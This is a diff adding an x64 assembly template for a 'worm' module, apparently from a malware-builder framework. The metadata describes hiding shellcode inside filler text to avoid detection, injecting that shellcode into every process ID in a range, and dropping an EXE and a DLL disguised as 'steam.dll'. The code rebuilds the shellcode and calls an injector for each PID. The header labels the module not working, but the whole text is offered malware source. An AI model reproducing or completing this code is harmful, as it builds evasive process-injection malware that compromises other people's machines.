@@ -1,0 +1,115 @@
+#!name##RiverRaid64
+#!types##worm
+#!info## !!!! [NOT WORKING] !!!! Assembler worm [W] [x64]. Hides shellcode in multiple text variables. Checks each PID in the specified range trying to inject shellcode [x64] into the process and run. Creates an EXE and DLL file with the injection function to avoid detection.
+#!globalVar##NO_DLL##Not include DLLs
+#!banned##module##starter##shadow##junk
+#!processWorm##BasicCombo
+#!lang##asm
+#!system_FLAG##[W]
+#!globalVar##COMPILER##mingw-x64##Compiler name
+#!globalVar##OS_EXEC##win##Target system executable
+#!reqVar##RR_scode##Shellcode to execute. You can paste your own or use ready-made ones from the FOOD section.##str##LOAD_SHELLCODE:True
+#!reqFood##FOOD_text##FOOD_random_text##Text to fill code
+#!reqVar##RR_start_pid##PID number from which the attack will start.##int
+#!reqVar##RR_stop_pid##PID number to which the attack will be stoped.##int
+#!setVar##RR_start_pid##800##int
+#!setVar##RR_stop_pid##10000##int
+#!reqVar##DLL_NAME##Name of DLL file and library that will be created.##str
+#!setVar##DLL_NAME##steam.dll##str
+#!reqSMod##DLL_Injector64
+
+
+extern ExitProcess
+extern Play
+
+; force RIP-relative addressing
+default rel
+
+section .data
+
+    {{TOOL.build_asm_scvar(FOOD_text, RR_scode, "var", "my_data")}}
+    var_limit: equ {{TOOL.shellcode_len(RR_scode)}}
+
+    spid: equ 1000
+    epid: equ 10000
+
+section .bss
+    target_pid: resq 1
+    spoint: resq 1  ; shellcode index
+    dpoint: resq 1  ; var index
+    score: resb 1024
+
+section .text
+    global main
+
+main:
+    and rsp, -16
+    call Build
+    call CheckProc
+    call EXIT
+
+Build:
+    .build_loop:
+        mov rcx, [dpoint]
+        cmp rcx, var_limit
+        je .build_end
+        call CheckScore
+        mov rcx, [dpoint]
+        inc rcx     ; var index + 1
+        mov [dpoint], rcx
+        jmp .build_loop
+        
+    .build_end:
+        ret
+    
+
+; IN: RCX - var index      
+CheckScore:
+    mov rdx, [var_data + 8 * rcx]
+    xor rcx, rcx    ; index
+    xor rax, rax    ; clear buffer
+    .cs_loop:
+        mov al, [rdx + rcx]
+        cmp al, 10
+        je .cs_end
+        inc rcx     ; index + 1
+        jmp .cs_loop
+        
+    .cs_end:
+        inc rcx
+        mov al, [rdx + rcx]
+        xor rbx, rbx
+        mov rbx, [spoint]
+        mov [score + rbx], al
+        inc rbx ; shellcode index + 1
+        mov [spoint], rbx
+        ret
+    
+    
+CheckProc:
+    mov rcx, spid
+    mov [target_pid], rcx
+    .cp_loop:
+        call P_SEP
+        mov rcx, [target_pid]
+        cmp rcx, epid
+        je .cp_end
+        
+        mov rdx, score
+        mov r8, var_limit
+        call Play
+        cmp rax, 1
+        je .cp_end
+        mov rcx, [target_pid]
+        inc rcx
+        mov [target_pid], rcx
+        jmp .cp_loop
+
+    .cp_end:
+        call EXIT
+        
+
+EXIT:
+    sub rsp, 32 ;shadow space
+    mov rcx, 0
+    call ExitProcess
